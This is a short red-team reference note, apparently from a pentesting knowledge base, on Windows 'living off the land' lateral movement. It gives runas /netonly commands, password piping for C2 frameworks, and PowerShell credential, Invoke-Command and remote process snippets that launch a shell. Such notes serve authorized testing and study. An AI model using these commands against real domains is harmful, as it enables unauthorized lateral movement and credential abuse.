# Living off the Land

## 01 - Command Prompt

### 1.1 - Netonly

This can be appropriately used for moving the active directory network laterally, and it's also part of **command and control** methods.

```
C:\> runas /netonly /user:<DOMAIN>\<username> C:\path\to\shell.exe

C:\> runas /noprofile /netonly /user:<DOMAIN>\<username> C:\path\to\shell.exe
```

If you're using a C2 framework then you pipe it through instead entering the password in a prompt.

```
C:\> cmd /c <password> | runas /netonly /user:<DOMAIN>\<username> C:\path\to\shell.exe

C:\> echo <password> | runas /netonly /user:<DOMAIN>\<username> C:\path\to\shell.exe
```

## 02 - PowerShell

Another method is using powershell to supply with the defined variables and execute with a powershell cmdlet `Start-Process`.

```powershell
PS C:\> $username = '<DOMAIN>\<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\path\to\shell.exe -NoNewWindow -Credential $credential -WorkingDirectory C:\Users\Public
```

You can also execute it remotely.

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

Syntax using the `Start-Process`.

```
PS C:\> Start-Process <commands> [-NoNewWindow] -ArgumentList (<arg_1>,<arg_2>, <arg_n>) -verb RunAs
```

Or you can remotely authenticate a network shared workstation to interact even further when you need to.

```
PS C:\> Invoke-Command -ComputerName <IP> -Credential $credential -ScriptBlock { <commands> }

PS C:\> Enter-PSSession -ComputerName <IP>
```

---
## References

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Domain Privilege Escalation/Token Impersonation/C2 Frameworks/Metasploit|Metasploit: Token]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Domain Privilege Escalation/Token Impersonation/C2 Frameworks/Sliver|Sliver: Token]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Domain Privilege Escalation/Token Impersonation/C2 Frameworks/Cobalt Strike|Cobalt Strike: Token]]